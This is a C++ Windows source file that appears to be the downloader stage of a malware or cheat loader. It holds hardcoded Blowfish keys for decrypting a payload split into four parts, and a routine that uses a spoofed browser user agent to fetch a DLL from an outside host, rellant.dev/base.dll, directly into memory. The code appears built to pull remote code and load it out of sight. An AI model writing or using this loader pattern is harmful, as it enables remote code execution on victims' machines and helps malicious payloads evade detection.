#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <WinInet.h>
#pragma comment(lib, "Wininet.lib")
#include "../blowfish/blowfish.h"
#include "streamer.h"

BLOWFISH blowfish1("2291558727225703");
BLOWFISH blowfish2("9569479730252029");
BLOWFISH blowfish3("5225356753114791");
BLOWFISH blowfish4("9989797623204228");

bool replace(std::string& str, const std::string& from, const std::string& to)
{
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}

std::string Decrypt(EncryptedData_t encryptedData)
{

	//decrypt each part
	std::string BufferDecrypted = blowfish1.Decrypt_CBC(encryptedData.a);
	BufferDecrypted += blowfish2.Decrypt_CBC(encryptedData.b);
	BufferDecrypted += blowfish3.Decrypt_CBC(encryptedData.c);
	BufferDecrypted += blowfish4.Decrypt_CBC(encryptedData.d);

	return BufferDecrypted;

}

std::string StreamFileToMemString(std::wstring URL)
{

	std::string url = std::string(URL.begin(), URL.end());

	const char* header = "Accept: *" "/" "*\r\n\r\n";
	HANDLE hInterWebz = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = InternetOpenUrlA(hInterWebz, url.c_str(), header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	InternetCloseHandle(hInterWebz);
	InternetCloseHandle(hURL);

	return data;

}

std::string GetDecryptedDLL()
{

	std::string data1 = StreamFileToMemString(LR"(https://rellant.dev/base.dll)");
	return data1;

}